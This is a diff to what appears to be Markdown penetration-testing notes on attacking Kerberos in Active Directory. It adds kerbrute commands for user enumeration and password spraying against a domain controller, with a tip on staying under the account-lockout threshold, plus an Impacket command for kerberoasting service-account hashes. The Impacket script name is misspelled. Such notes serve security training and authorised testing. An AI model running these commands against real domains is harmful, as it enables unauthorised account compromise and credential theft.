@@ -8,6 +8,20 @@ Lets talk about some attacks to carry out a domain privilege escalation in order
 
 # Attacking Kerberos
 
+## Kerberos brute force
+
+Kerberos is an authentication protocol, so it is possible to perform a bruteforce attack.
+
+> **Note**: Important to not block user accounts by default the policy sets the block after 5 fail attempts.
+
+With kerbrute it is possible to do password spray attacks, user enumeration an more:
+
+```
+kerbrute userenum --dc 10.10.10.10 -d example.com users.txt
+kerbrute passwordspray --dc 10.10.10.10 -d example.com users.txt Password
+kerbrute passwordspray --user-as-pass --dc 10.10.10.10 -d example.com users.txt
+```
+
 ## Kerberoasting
 
 The Kerberos session ticket as known as `TGS` has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
@@ -105,6 +119,12 @@ You can also specify a user:
 
 ```
 .\Rubeus.exe kerberoast /user:svcadmin /outfile:hashes.kerberoast
+```
+
+* Impacket
+
+```
+impacket-GetUsersSPNs example.local/username:passwrod -outputfile hashes.kerberoast 
 ```
 ### Cracking the tickets
 
